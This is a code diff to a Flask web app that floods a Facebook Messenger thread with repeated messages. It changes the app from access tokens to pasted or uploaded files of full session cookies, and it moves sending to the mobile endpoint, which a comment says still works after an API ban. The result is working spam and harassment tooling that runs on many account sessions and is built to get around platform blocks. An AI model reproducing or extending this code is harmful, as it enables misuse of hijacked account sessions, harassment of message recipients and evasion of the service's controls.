@@ -13,7 +13,6 @@ headers = {
     'Cache-Control': 'max-age=0',
     'Upgrade-Insecure-Requests': '1',
     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate',
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
@@ -24,24 +23,29 @@ stop_events = {}
 threads = {}
 message_counters = {}
 
-def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
+def send_messages(cookies_list, thread_id, mn, time_interval, messages, task_id):
     stop_event = stop_events[task_id]
     message_counters[task_id] = 0
-    while not stop_event.is_set():
-        for message1 in messages:
-            if stop_event.is_set():
-                break
-            for access_token in access_tokens:
-                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                message = str(mn) + ' ' + message1
-                parameters = {'access_token': access_token, 'message': message}
+    for cookie in cookies_list:
+        while not stop_event.is_set():
+            for message1 in messages:
+                if stop_event.is_set():
+                    break
+                api_url = f'https://m.facebook.com/messages/send/?icm=1&refid=12' # Mobile endpoint, API ban hone ya error pe yahi kaam aata hai
+                payload = {
+                    'ids[0]': thread_id,
+                    'message': f"{mn} {message1}",
+                    'fb_dtsg': '', # Sometimes required, can parse if needed (optional - not mandatory for mobile endpoint)
+                }
+                local_headers = headers.copy()
+                local_headers['Cookie'] = cookie
                 try:
-                    response = requests.post(api_url, data=parameters, headers=headers)
-                    if response.status_code == 200:
+                    response = requests.post(api_url, data=payload, headers=local_headers)
+                    if response.status_code == 200 and 'success' in response.text:
                         message_counters[task_id] += 1
-                        print(f"✅ Sent ({message_counters[task_id]}): {message}")
+                        print(f"✅ Sent ({message_counters[task_id]}): {payload['message']}")
                     else:
-                        print(f"❌ Failed: {message}")
+                        print(f"❌ Failed: {payload['message']}")
                 except Exception as e:
                     print("Error:", e)
                 time.sleep(time_interval)
@@ -49,12 +53,12 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
     if request.method == 'POST':
-        token_option = request.form.get('tokenOption')
-        if token_option == 'single':
-            access_tokens = [request.form.get('singleToken')]
+        cookie_option = request.form.get('tokenOption')
+        if cookie_option == 'single':
+            cookies_list = [request.form.get('singleToken')]
         else:
             token_file = request.files['tokenFile']
-            access_tokens = token_file.read().decode().strip().splitlines()
+            cookies_list = token_file.read().decode().strip().splitlines()
 
         thread_id = request.form.get('threadId')
         mn = request.form.get('kidx')
@@ -66,7 +70,7 @@ def send_message():
         task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
 
         stop_events[task_id] = Event()
-        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
+        thread = Thread(target=send_messages, args=(cookies_list, thread_id, mn, time_interval, messages, task_id))
         threads[task_id] = thread
         thread.start()
 
@@ -171,18 +175,18 @@ PAGE_HTML = '''
   <div class="container text-center">
     <form method="post" enctype="multipart/form-data">
       <div class="mb-3">
-        <label for="tokenOption" class="form-label">Select Token Option</label>
+        <label for="tokenOption" class="form-label">Select Cookie Option</label>
         <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
-          <option value="single">Single Token</option>
-          <option value="multiple">Token File</option>
+          <option value="single">Single Cookie String</option>
+          <option value="multiple">Cookie File</option>
         </select>
       </div>
       <div class="mb-3" id="singleTokenInput">
-        <label>Enter Single Token</label>
+        <label>Enter Full Cookie</label>
         <input type="text" class="form-control" name="singleToken">
       </div>
       <div class="mb-3" id="tokenFileInput" style="display:none;">
-        <label>Choose Token File</label>
+        <label>Choose Cookie File (txt)</label>
         <input type="file" class="form-control" name="tokenFile">
       </div>
       <div class="mb-3">
@@ -255,5 +259,3 @@ PAGE_HTML = '''
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5040)
-        
-
